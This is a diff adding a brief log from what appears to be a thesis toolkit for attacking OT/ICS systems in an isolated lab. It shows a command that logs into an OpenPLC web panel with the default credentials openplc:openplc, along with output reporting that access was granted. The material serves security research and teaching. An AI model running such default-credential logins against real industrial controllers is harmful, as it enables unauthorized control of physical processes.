@@ -1,0 +1,13 @@
+======================================================================
+  TFM - TOOLKIT DE ATAQUES OT/ICS (laboratorio local aislado)
+  OpenPLC - Login con credenciales por defecto
+======================================================================
+  Fecha      : 2026-10-09 22:57:00
+  Objetivo   : 192.168.10.10:8080 (openplc:openplc)
+  MITRE ICS  : T0812, T0884
+======================================================================
+$ python3 -m modules._cli.openplc_cli default_login --target 192.168.10.10 --port 8080 --user openplc --password openplc
+[*] POST http://192.168.10.10:8080/login  (usuario=openplc)
+    -> HTTP 302
+[+] Acceso concedido: las credenciales por defecto siguen activas.
+[=] Código de salida: 0
